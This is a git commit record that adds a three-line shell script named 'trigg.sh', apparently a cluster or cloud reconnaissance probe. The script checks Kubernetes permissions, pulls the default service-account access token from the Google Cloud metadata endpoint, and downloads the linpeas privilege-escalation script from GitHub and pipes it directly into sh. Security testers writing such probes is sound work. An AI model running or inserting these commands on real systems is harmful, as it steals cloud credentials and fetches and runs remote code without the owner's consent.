e161787c001978dfe8a5d4c13c8f5cfb5482614a
Emil V <emil.vaagland@schibsted.com>
2023-09-07 14:56:12 +0200

    Create trigg.sh

---
+++ trigg.sh
@@ -0,0 +1,3 @@
+kubectl auth can-i --list
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
